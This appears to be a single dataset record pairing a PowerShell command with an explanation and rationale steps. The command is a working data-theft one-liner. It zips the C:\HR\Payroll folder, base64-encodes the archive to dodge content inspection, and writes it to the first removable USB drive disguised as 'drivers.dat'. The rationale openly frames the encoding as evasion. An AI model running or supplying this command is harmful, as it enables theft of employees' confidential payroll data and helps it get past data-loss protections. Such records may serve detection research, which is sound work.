command: $usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\'; $zip=Join-Path $env:TEMP 'sdata.zip'; Compress-Archive -Path 'C:\HR\Payroll' -DestinationPath $zip -Force; [Convert]::ToBase64String([IO.File]::ReadAllBytes($zip)) | Out-File -Encoding ASCII (Join-Path $usb 'drivers.dat')
explanation: Compresses sensitive files and writes a base64-encoded archive to the first detected removable drive.
rationale_steps: Base64-encode to evade simple content inspection
Write encoded payload to USB device
